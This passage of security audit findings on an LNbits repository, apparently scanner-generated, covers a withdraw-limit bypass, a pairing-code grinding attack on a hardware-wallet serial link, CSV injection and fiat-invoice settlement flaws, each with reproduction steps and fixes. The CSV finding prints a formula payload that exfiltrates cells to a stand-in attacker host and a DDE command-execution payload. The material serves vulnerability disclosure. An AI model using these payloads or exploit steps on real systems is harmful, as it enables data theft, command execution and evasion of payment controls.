Result: any payment made with the admin key of a send-only mirror wallet is debited from the source wallet with the per-wallet daily withdraw limit and inter-transaction spacing limit never evaluated. A user whose wallet is subject to these limits can trivially self-grant the bypass: register a second account (self-registration is on by default), invite it from the source wallet with permissions ['send-payments'], accept the invite (POST /api/v1/wallet with wallet_type lightning-shared), and spend via the mirror's admin key. When the share includes view-payments the limit is computed against the correct source wallet (get_payments maps to source_wallet_id), which shows the intended behaviour and that the gap is specifically the send-without-view combination.

The maximum-balance limit and the balance check itself are not affected (the balance check in _pay_invoice is against the source wallet), so the attacker cannot spend more than the wallet holds; what is defeated is the operator's velocity control on withdrawals.

## Evidence
1. [lnbits/core/services/payments.py:1128–1144](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L1128-L1144)
   _check_wallet_for_payment is called with the wallet id taken from the API key (the mirror wallet's id when a shared-wallet key is used) and passes that same id to check_wallet_limits, instead of wallet.source_wallet_id. The actual debit a few lines later (_pay_invoice(wallet.source_wallet_id, ...)) is made against the source wallet, so the limit is evaluated for a different wallet than the one that is charged.
2. [lnbits/core/crud/payments.py:138–144](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/payments.py#L138-L144)
   get_payments(wallet_id=...) resolves the wallet and, when wallet.can_view_payments is False, returns an empty page instead of the payments. A mirror wallet whose share grants send-payments but not view-payments therefore always appears to have zero prior payments.
3. [lnbits/core/services/payments.py:601–655](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L601-L655)
   check_time_limit_between_transactions and check_wallet_daily_withdraw_limit both treat an empty get_payments() result as 'no payments yet' and return without enforcing lnbits_wallet_limit_secs_between_trans / lnbits_wallet_limit_daily_max_withdraw.
4. [lnbits/core/models/wallets.py:182–214](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/wallets.py#L182-L214)
   has_permission for a lightning-shared wallet returns True only for permissions in share_permissions; can_view_payments is False for a send-only share while can_send_payments is True, which is exactly the combination that lets the payment proceed with the limit check skipped.
5. [lnbits/core/services/payments.py:1393–1436](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L1393-L1436)
   _pay_from_wallet calls _check_wallet_for_payment with the mirror wallet id, passes the can_send_payments check (true for a send-only share) and then debits wallet.source_wallet_id via _pay_invoice, so the spend lands on the owner's wallet while the limit was computed for the mirror id. check_wallet_limits has no other caller (only services/payments.py:1143), so no limit check runs against the source wallet.
6. [lnbits/core/views/payment\_api.py:280–319](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/payment_api.py#L280-L319)
   POST /api/v1/payments with out=true and an admin key passes key_info.wallet.id (the mirror wallet id for a shared-wallet key) into pay_invoice, which is the network-reachable entry point for this path.
7. [lnbits/core/services/wallets.py:39–73](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/wallets.py#L39-L73)
   invite_to_wallet lets a wallet owner grant any subset of permissions, including send-payments without view-payments, to another account; the owner can therefore also grant this to a second account they control.

## Impact
The operator's per-wallet spending velocity controls are bypassed, so funds can leave the funding source faster than policy allows; the balance check still holds, so no funds beyond the wallet's balance are at risk. This is a limited integrity impact on the server's enforcement of its own policy; no confidentiality or availability impact.

## Reproduction steps
1. Attacker is any authenticated user. With self-registration open by default (lnbits_allow_new_accounts=True, settings.py:47) a wallet owner creates a second account, invites it from the limited wallet with permissions ['send-payments'] (PUT /api/v1/wallet/share/invite, require_admin_key), accepts from the second account (POST /api/v1/wallet, wallet_type lightning-shared, shared_wallet_id) which creates the mirror wallet and approves the share with the invited permissions (_accept_invitation_to_shared_wallet), then calls POST /api/v1/payments out=true with the mirror's admin key. _check_wallet_for_payment runs check_wallet_limits(mirror_id); get_payments_paginated resolves the mirror, sees can_view_payments False and returns an empty page, so both the secs-between and daily-withdraw checks return early; _pay_from_wallet then debits source_wallet_id. Any grantee the owner gives a send-only share can do the same against the owner's wallet. The limiter being configured is the surface being bypassed, not an attack requirement: in a deployment using the operator's Wallet Limiter nothing beyond ordinary account registration and standard API calls is needed, and no race or special condition is involved.

## Recommended fix
1. check_wallet_limits is evaluated for the mirror wallet id while the debit is applied to wallet.source_wallet_id, so the two operate on different ledgers. Fix criteria: Spending limits must be evaluated against the wallet that is actually debited (the source wallet) regardless of which key or mirror initiated the payment. Verify that a payment via a send-only mirror key counts toward, and is blocked by, the source wallet's daily withdraw and spacing limits exactly as a payment made with the source wallet's own admin key.
2. get_payments silently returns an empty result when the caller's wallet lacks view-payments, and the limit checks interpret 'no payments returned' as 'no payments exist'. Fix criteria: Internal policy checks must not depend on the caller's view permission: either query the ledger directly by source wallet id without the permission gate, or fail closed when the payment history cannot be read. Verify that a send-only mirror payment is rejected when the source wallet has reached its daily limit.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Incorrect authorization
**CWE:** [CWE-863](https://cwe.mitre.org/data/definitions/863.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257185

---

# Bowser serial pairing uses 20-bit uncommitted code, letting a USB interposer grind a matching key

## Details
The Web Serial signer (`onchain-serial-signer`, included on every LNbits page via components.vue and shipped in the JS bundle) pairs with a Bowser hardware wallet by an unauthenticated ECDH exchange in `hwwPair` (serial-signer.js:577-636). The browser writes `/pair <browserPub>` in cleartext, accepts whatever `/pair 0 <devicePub>` comes back, and derives the AES-256-CBC key directly from the shared x-coordinate. The only protection against a machine-in-the-middle on the USB/serial path (malicious cable, hub, or a compromised USB-serial bridge sitting between the host and the signer) is the user comparing a 5-hex-character code, `sha256(hex(x))[0:5]` = 20 bits, with the device display.

There is no commitment step: the device-side code is fixed once the interposer has forwarded its own key M1 to the real device and received the device key D (the device's `/pair 0 D` reply reveals it), giving code_dev = H(m1*D). The interposer then grinds a second scalar m2 until H(m2*B)[0:5] == code_dev[0:5], where B is the browser key it already captured — expected 2^20 secp256k1 point multiplications, which commodity hardware completes well inside the 20 s `/pair` timeout the browser allows (serial-signer.js:590-595). It then replies `/pair 0 M2`. The browser and the device now display identical codes, the user confirms, and the interposer holds both session keys.

From then on every "secure" command is plaintext to the attacker: `/password <password> <passphrase>` (hwwLogin, :395-402) discloses the device password and BIP39 passphrase; `/restore <password> <mnemonic>` (hwwRestore, :855-858) discloses the complete recovery phrase typed through `seed-input`; `/xpub` responses disclose account keys. Because the channel has no MAC (encryptMessage/decryptMessage :1032-1048), the attacker can also forge device replies, e.g. acknowledge `/psbt-commit` and return any PSBT, though the server-side re-verification of hardware-signed PSBTs limits that to review-UI confusion rather than theft.

The weakness is in the browser-side protocol implementation: it neither requires a device commitment before revealing its key, nor a key-confirmation MAC, nor a code long enough to make grinding infeasible, and it accepts any curve point as the peer key. Firmware changes are needed for a full fix, but the browser is the party that decides what it will accept and display.

## Evidence
1. [lnbits/static/js/components/onchain/serial-signer.js:577–636](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/js/components/onchain/serial-signer.js#L577-L636)
   hwwPair writes the browser's ephemeral ECDH public key in cleartext, accepts any on-curve 64-byte key in the plaintext '/pair 0 <key>' reply (only a 128-hex regex and Point.fromHex curve check), uses the raw ECDH x-coordinate as the AES key, and shows the user sha256(hex(x))[0:5] uppercase (20 bits) as the sole confirmation. No commitment to the device key before the browser reveals its own, no device identity, no key-confirmation round: a party that sees the browser key first can pick its own scalar so the browser-displayed code equals the device-displayed one.
2. [lnbits/static/js/components/onchain/serial-signer.js:590–595](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/js/components/onchain/serial-signer.js#L590-L595)
   /pair is awaited with a 20000 ms timeout; the interposer must finish its ~2^20 point operations (incremental additions of the captured browser key) inside this window, which commodity hardware does in about a second.
3. [lnbits/static/js/components/onchain/serial-signer.js:391–402](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/js/components/onchain/serial-signer.js#L391-L402)
   hwwLogin sends '/password <password> <passphrase>' through the channel keyed by the grindable pairing; the device password and BIP39 passphrase are readable by whoever holds the browser-side session key.
4. [lnbits/static/js/components/onchain/serial-signer.js:848–859](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/js/components/onchain/serial-signer.js#L848-L859)
   hwwRestore sends '/restore <password> <mnemonic>' through the same channel, disclosing the full recovery phrase typed into the LNbits UI during the restore flow.
5. [lnbits/static/js/components/onchain/serial-signer.js:969–994](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/js/components/onchain/serial-signer.js#L969-L994)
   extractCommand treats /pair, /log, /new, /psbt-begin, /psbt-chunk, /psbt-review, /password-clear and /ping lines as cleartext, so the whole pairing exchange is observable and rewritable by anything on the serial path.
6. [lnbits/static/js/components/onchain/serial-signer.js:940–964](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/js/components/onchain/serial-signer.js#L940-L964)
   sendCommandSecure encrypts every post-pairing command (password, restore, xpub, psbt-commit, sign, wipe) under this.sharedSecret with a random IV and no authentication tag; with the ground key the interposer both decrypts these and forges device replies.
7. [lnbits/static/js/components/onchain/serial-signer.js:1032–1048](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/js/components/onchain/serial-signer.js#L1032-L1048)
   encryptMessage/decryptMessage are aesjs CBC with space padding and no MAC, so the channel offers no integrity even to a correctly paired session.
8. [tests/onchain/hardware-signers.test.cjs:160–171](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/tests/onchain/hardware-signers.test.cjs#L160-L171)
   The project's own device model: on '/pair <browserKey>' the device computes the shared secret from the key it was sent, displays sha256(hex(secret))[0:5], and reveals its own public key in a cleartext '/pair 0 <deviceKey>' reply. This confirms the protocol has no commitment phase on either side, so the relay-and-grind attack is possible against the device as the project models it.

## Impact
Confidentiality: full disclosure of the hardware wallet password, BIP39 passphrase and, on the restore flow, the complete mnemonic — the keys to all funds the device controls. Integrity: without a MAC the interposer can forge device acknowledgements and review-stage messages shown to the user, but the LNbits server re-verifies signatures on returned PSBTs before finalising, so spend integrity is only partially affected. Availability: none beyond failing the session.

## Reproduction steps
1. Attacker is interposed on the USB/serial path (tampered cable, hub or USB-serial bridge) when the user pairs. It captures the browser's cleartext key B, sends its own key M1 to the device, learns D from the device's cleartext reply and so the device-displayed code H(m1*D)[0:5]; it then grinds m2 (about 2^20 point additions of B, well inside the 20 s /pair timeout) until H(m2*B)[0:5] matches and answers '/pair 0 M2'. Both displays agree, the user confirms, and the interposer holds both session keys; the user then sends the password/passphrase or mnemonic.

## Recommended fix
1. The pairing confirmation code is a 20-bit truncation of an uncommitted ECDH shared secret, so a party that learns one side's public key first can choose its own key to force a code collision; the browser accepts any peer key and never performs key confirmation. Fix criteria: An interposer that sees the browser key before choosing its own must not be able to make the browser-displayed code equal the device-displayed code with non-negligible probability: e.g. require the device to commit to its key (hash) before the browser reveals its key, or display a code long enough (>= 64 bits) that grinding is infeasible, and add an explicit key-confirmation MAC round so a mismatched key fails before any password/mnemonic is sent. Verify by modelling the relay-and-grind attacker against the pairing state machine.
2. The serial channel is AES-CBC with a per-message IV and no authentication tag, so any party with the key or on the path can alter or forge device responses undetected. Fix criteria: Every encrypted frame must carry an integrity tag (AEAD or encrypt-then-MAC with a key derived via a KDF from the shared secret) and the browser must reject frames whose tag fails before parsing; verify that a flipped IV or ciphertext byte is rejected rather than parsed as a command.

---
**Severity:** LOW
**Status:** Open
**Category:** Unauthenticated key exchange
**CWE:** [CWE-322](https://cwe.mitre.org/data/definitions/322.html)
**Attack vector:** PHYSICAL
**Attack complexity:** HIGH
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257560

---

# Payment CSV export emits attacker-controlled memo/comment/details without formula escaping

## Details
The wallet's payment list offers 'Export CSV' / 'Export CSV with details' (lnbits-payment-list.vue:163-220). `exportCSV` in lnbits-payment-list.js (369-433) collects every payment of the wallet and calls `LNbits.utils.exportCSV`, whose `wrapCsvValue` (utils.js:274-283) performs only `"`-doubling and quoting before the content is handed to `Quasar.exportFile` as text/csv. There is no neutralisation of the formula-trigger characters `=`, `+`, `-`, `@`, `\t`, `\r` at the start of a cell. Excel and Google Sheets strip the surrounding quotes and evaluate such cells as formulas, so an attacker who controls any exported cell can have spreadsheet formulas evaluated on the exporting user's machine (CWE-1236).

Controlled cells and who controls them:
- `extra.comment` ('Comment' column): any anonymous payer of the wallet's lightning address via the `comment` query parameter of the unauthenticated GET /api/v1/lnurl/wallet/{username}/cb route (lnurl_api.py:68-75 -> lightning_address.py:106-125); only the length (<=799) is checked and the value is stored verbatim.
- `memo` of outgoing payments: `_pay_invoice` stores `description or pr.description` (services/payments.py:1423), so the remote payee's bolt11 description becomes the memo whenever the owner pays an invoice without an explicit description.
- `memo` (<=640 chars), `tag` (extra.tag), `webhook`: any invoice-key holder via POST /api/v1/payments (CreateInvoice, models/payments.py:289-305; passed unchanged at services/payments.py:256-271). The invoice key is a receive-only credential routinely embedded in public pages and PoS devices.
- `extra.details`: a JSON string chosen by the invoice-key holder; in detailed mode its keys become column headers and its values become cells (lnbits-payment-list.js:408-420).

Example payload as a lightning-address comment: `=HYPERLINK("https://evil.example/?x="&A2&B2,"open")` (exfiltrates adjacent cells on click) or a DDE payload `=cmd|'/C calc'!A0` (code execution after the victim accepts the spreadsheet's warning). `rewrite_values` (db.py:147-162) is applied only to bound query parameters and only strips `<...>`/entities, so the payload is stored and returned by GET /api/v1/payments unchanged.

Impact is on the exporting user's workstation/spreadsheet (a subsequent system), not on the LNbits service, and requires the victim to export and open the file in a spreadsheet application that evaluates CSV formulas and, for DDE, to accept the application's warning. It is nonetheless a deterministic path from an unauthenticated network attacker (lightning-address payer or payee) into a file the wallet owner is invited to generate and open.

## Evidence
1. [lnbits/static/js/utils.js:273–284](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/js/utils.js#L273-L284)
   wrapCsvValue only doubles embedded double quotes and wraps the cell in quotes; cells beginning with =, +, -, @, tab or CR are written as-is. Excel (and Google Sheets on import) strip the surrounding quotes and evaluate such cells as formulas, so quoting alone does not neutralise them. The content is handed to Quasar.exportFile as text/csv.
2. [lnbits/static/js/components/lnbits-payment-list.js:369–432](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/js/components/lnbits-payment-list.js#L369-L432)
   exportCSV fetches every payment of the wallet (up to 100 pages x 1000) and, in detailed mode, turns the keys of the creator-supplied extra.details JSON into additional column labels and their values into cells, then hands everything to LNbits.utils.exportCSV without any formula neutralisation.
3. [lnbits/static/js/components/lnbits-payment-list.js:51–127](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/js/components/lnbits-payment-list.js#L51-L127)
   The export columns include memo, tag (extra.tag), webhook and row.extra.comment, all of which are set by the payment creator, by the remote payee of an outgoing payment, or by an anonymous lightning-address payer.
4. [lnbits/core/services/lightning\_address.py:106–124](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/lightning_address.py#L106-L124)
   An anonymous payer of the wallet's lightning address supplies `comment` (up to COMMENT_ALLOWED=799 chars) via the unauthenticated GET /api/v1/lnurl/wallet/{username}/cb route; only its length is checked and it is stored verbatim as extra.comment.
5. [lnbits/core/services/payments.py:1423](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L1423)
   For outgoing payments the stored memo is `description or pr.description`: when the wallet owner pays a bolt11 invoice without supplying a description (the wallet UI does not), the remote payee's invoice description becomes the exported memo cell.
6. [lnbits/core/models/payments.py:289–304](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/payments.py#L289-L304)
   CreateInvoice.memo (640 chars), webhook and the free-form extra dict (including extra.details and extra.tag) are accepted from any invoice-key holder via POST /api/v1/payments and passed unchanged to create_invoice (services/payments.py:256-271).

## Impact
LNbits itself (server and browser session) is not affected; the CSV file is a passive download and nothing executes on the LNbits origin. Subsequent-system impact: The formula executes inside the victim's spreadsheet application on their workstation: HYPERLINK/WEBSERVICE-style formulas can exfiltrate the exported payment data (memos, hashes, amounts) to the attacker; DDE/command formulas can run commands if the user accepts the application's warning dialogs. Impact is bounded by those warnings and by the application's security settings.

## Reproduction steps
1. An anonymous payer sends a lightning-address payment with a formula in `comment`, a payee issues a bolt11 invoice whose description starts with `=`, or an invoice-key holder creates an invoice with a formula memo/details. The payment is stored and returned unchanged. The wallet owner later clicks Export CSV and opens the file in a spreadsheet application; the formula is evaluated (HYPERLINK exfiltration on click, DDE execution after accepting a warning). Requires the wallet to have a lightning address set / the owner to pay the attacker's invoice / the attacker to hold an invoice key, and a spreadsheet application that evaluates CSV formulas (Excel, Google Sheets import); hence attack requirements present and active user interaction. No privileges on LNbits are needed.

## Recommended fix
wrapCsvValue in LNbits.utils.exportCSV does not neutralise cells that begin with formula-trigger characters, so attacker-controlled text is exported in a form spreadsheet applications execute. Fix criteria: Every exported cell whose first character is one of = + - @ \t \r (after trimming) must be prefixed with a neutral character (e.g. a single quote or space) or otherwise rendered inert, for all callers of exportCSV. Verify that a payment with memo '=HYPERLINK("http://x","y")' exports as a literal string that Excel/LibreOffice display rather than evaluate.

---
**Severity:** LOW
**Status:** Open
**Category:** CSV injection
**CWE:** [CWE-1236](https://cwe.mitre.org/data/definitions/1236.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** LOW
**Subsequent system integrity impact:** LOW
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257552

---

# Pending fiat-provider invoices are payable with sats internally, crediting FIAT wallets and marking card invoices paid

## Details
Fiat-provider invoices (Stripe/PayPal/Square/Revolut) are implemented as pending FakeWallet invoices: `create_fiat_invoice` sets `internal=True` (payments.py:187), `create_invoice` uses `fake_wallet` to mint a bolt11 with a fresh payment hash, stores it pending in `apipayments` with the FakeWallet bolt11 in `bolt11`, and only adds the provider checkout URL in `extra.fiat_payment_request` / `checking_id = fiat_<provider>_...` (payments.py:213-227). The response `Payment` (payment_api.py:328) carries both `payment_request` (card URL) and `bolt11` (fake invoice).

The internal payment path has no notion of fiat invoices. `_pay_internal_invoice` (payments.py:803-874) calls `check_internal(hash)` (crud/payments.py:561-575: any pending incoming row with that hash), re-reads the row by checking_id, checks amount and bolt11 equality - both match because the bolt11 is the row's own - debits the payer and sets the receiving row to SUCCESS, enqueuing it on `internal_invoice_queue` so webhooks, extensions and notifications fire as 'paid'.

Consequences:
1. A FIAT-type wallet is credited by a Lightning (internal) payment, contradicting the explicit invariant at payments.py:325-328 ('Fiat wallets only accept cash or fiat provider payments') and the FIAT test suite. The wallet cannot send (has_permission), so the sats are stuck in the ledger; the merchant's systems see the order as paid while no fiat arrived at the provider, and the operator's fiat totals (get_total_balance(fiat=True), is_fiat breakdown) now include sats.
2. The fiat service fee (`fee = -service_fee_fiat`) is deducted from the receiver but `handle_fiat_payment_confirmation` never runs, so it is credited to no wallet; the faucet is not debited.
3. `check_fiat_status` returns early on `payment.success` (fiat_providers.py:43), so if the card checkout is subsequently paid, the provider payment is silently ignored in the ledger.

Attack: merchant M (allowed user) runs a shop whose public client uses M's invoice key and receives the full `Payment` for a card checkout (bolt11 included). Customer C, holding any LNbits wallet admin key on the same instance, posts `{out:true, payment_request:<bolt11>}` to /api/v1/payments. C's wallet is debited the sat amount, M's fiat invoice becomes SUCCESS, M's webhook/extension delivers the goods, and M's FIAT wallet holds non-withdrawable sats instead of a provider payout. A FIAT-wallet owner can also obtain such an internally payable invoice directly by posting `internal: true` with their invoice key (CreateInvoice.internal is client-controlled), bypassing the `not internal` guard at payments.py:325.

This extends the existing `fiat-settlement-via-status-poll-overwrites-service-fee` / `service-fee-charged-on-incoming-via-status-poll` records (which concern the status-poll settlement path) with a different source: settlement by an internal Lightning payer.

## Evidence
1. [lnbits/core/services/payments.py:803–861](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L803-L861)
   _pay_internal_invoice looks up the receiving invoice solely by payment hash (check_internal) and checking_id, compares amount and bolt11, debits the payer and flips the receiving row to SUCCESS. It never inspects the receiving row's fiat_provider, its checking_id prefix (fiat_...), or the receiving wallet's type, so a pending fiat-provider invoice on a FIAT wallet is settled by a Lightning-internal sat payment.
2. [lnbits/core/services/payments.py:187–191](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L187-L191)
   create_fiat_invoice forces `invoice_data.internal = True` and creates the row through create_wallet_invoice, i.e. a FakeWallet-signed bolt11 that is pending in apipayments with payment_hash = the fake invoice's hash - exactly what check_internal matches.
3. [lnbits/core/services/payments.py:213–228](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L213-L228)
   The row keeps the FakeWallet bolt11; the provider's URL is stored only in extra.fiat_payment_request and the checking_id is renamed fiat_<provider>_<id>. The payment stays PENDING until the provider confirms, which is the window the internal payment exploits.
4. [lnbits/core/services/payments.py:325–328](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L325-L328)
   create_invoice encodes the maintainers' invariant: 'Fiat wallets only accept cash or fiat provider payments.' A Lightning payment crediting a FIAT wallet violates it; the internal-payment path is the way around it.
5. [lnbits/core/crud/payments.py:561–575](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/payments.py#L561-L575)
   check_internal returns ANY pending incoming apipayments row with the given payment hash, regardless of wallet type or fiat_provider.
6. [lnbits/core/models/payments.py:121–126](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/payments.py#L121-L126)
   Payment.__init__ sets payment_request to the provider URL for fiat invoices but leaves the FakeWallet invoice in `bolt11`, so every API/extension response that returns the Payment hands out the internally payable bolt11 together with the card checkout link.
7. [lnbits/core/models/payments.py:289–291](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/payments.py#L289-L291)
   CreateInvoice.internal is a client-settable field (default False). A FIAT-wallet invoice key can also post `internal: true` without any fiat_provider and obtain a pending FakeWallet invoice on the FIAT wallet directly (create_invoice's FIAT guard is `... and not internal`), a second source for the same sink.
8. [lnbits/core/services/fiat\_providers.py:40–46](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/fiat_providers.py#L40-L46)
   check_fiat_status returns early once payment.success is set, so after an internal sat payment the later provider webhook (or a real card payment) is never processed: handle_fiat_payment_confirmation (fee credit / faucet debit) is skipped and a subsequent genuine card payment for the same checkout is not reflected in the ledger.
9. [lnbits/core/views/payment\_api.py:280–328](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/payment_api.py#L280-L328)
   Network entry points: the receiver creates the fiat invoice here with an invoice key (out:false, fiat_provider / internal passed through), and the payer pays the exposed bolt11 here with any wallet admin key (out:true).
10. [tests/api/test\_fiat\_wallet\_type.py:350–369](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/tests/api/test_fiat_wallet_type.py#L350-L369)
   test_fiat_wallet_rejects_lightning_receiving asserts FIAT wallets cannot receive Lightning invoices, but its parametrization never sets `internal: true` and no test pays a pending fiat invoice's bolt11 internally; the invariant is believed to hold and is not tested on this path.

## Impact
Integrity of another user's fiat accounting: a receive-only FIAT wallet (admin UI: 'receive-only fiat wallets ... for cash settlement'; has_permission denies SEND, withdrawable_balance is 0) is credited with Lightning sats it can never spend, and a Stripe/PayPal/Square/Revolut checkout is reported paid to the merchant's webhook, extensions and UI (internal_invoice_queue -> _invoice_dispatcher) although the provider received nothing. handle_fiat_payment_confirmation never runs on this path, so the fiat service fee deducted from the receiver (fee = -service_fee_fiat) is credited to no wallet, the faucet is untouched, and check_fiat_status's early return on payment.success (fiat_providers.py:43) discards any later genuine card payment on the still-open checkout. The payer spends real sats, so no unbacked funds are created and no wallet is drained: integrity LOW; no confidentiality or availability impact.

## Reproduction steps
1. Attacker position: any registered user with a funded wallet admin key on the same instance (POST /api/v1/payments out:true, payment_api.py:280-329) who holds the bolt11 of a pending fiat-provider invoice. That bolt11 is the FakeWallet invoice stored in the row and is returned in every Payment object to the merchant's invoice-key client (models/payments.py:121-127 keeps it in `bolt11` beside the card URL in `payment_request`); the threat model records that invoice keys are embedded in public apps, so the customer-facing client commonly sees it. The pay path has no payee check (_validate_payment_request, payments.py:1147-1174), check_internal matches any pending incoming row by hash (crud/payments.py:561-575), and _pay_internal_invoice's amount/bolt11 equality passes because the payer submits the row's own bolt11 (assumption: the pinned `bolt11` package encodes lowercase bech32, so `.lower()` equality holds, as every internal FakeWallet payment in the project relies on). Preconditions: a fiat provider enabled and a pending fiat invoice whose bolt11 reached the attacker (AT:PRESENT). No race, no victim interaction.

## Recommended fix
1. _pay_internal_invoice settles any pending incoming row matched by payment hash, including fiat-provider invoices (checking_id fiat_*, fiat_provider set) and invoices on FIAT-type wallets, so Lightning-internal payments bypass the 'fiat wallets only accept cash or provider payments' rule. Fix criteria: An internal payment must be refused when the matched incoming row has fiat_provider set / a fiat_ checking_id, or when the receiving wallet is FIAT-type. Verify: paying the bolt11 of a pending Stripe invoice from another wallet fails with no debit and the fiat row stays pending; a FIAT wallet never gains balance from pay_invoice.
2. CreateInvoice.internal is accepted from API clients, letting a FIAT-wallet invoice key mint pending FakeWallet invoices that are internally payable. Fix criteria: The `internal` flag must not be honoured from external API input (or must be rejected for FIAT wallets); verify that POST /api/v1/payments with internal:true on a FIAT wallet is refused.

---
**Severity:** LOW
**Status:** Open
**Category:** Improper access control
**CWE:** [CWE-841](https://cwe.mitre.org/data/definitions/841.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257550

---

# Per-wallet maximum balance limit enforced only at invoice creation; pre-created invoices exceed it

## Details
`lnbits_wallet_limit_max_balance` ('Maximum wallet balance', SecuritySettings, settings.py:480) lets an operator cap how many sats a single wallet may hold - a custodial exposure control. For incoming funds it is enforced in exactly one place, `create_invoice` (services/payments.py:345-352):

```python
if settings.is_wallet_max_balance_exceeded(user_wallet.balance_msat / 1000 + amount_sat):
    raise InvoiceError("Wallet balance cannot exceed ...")
```

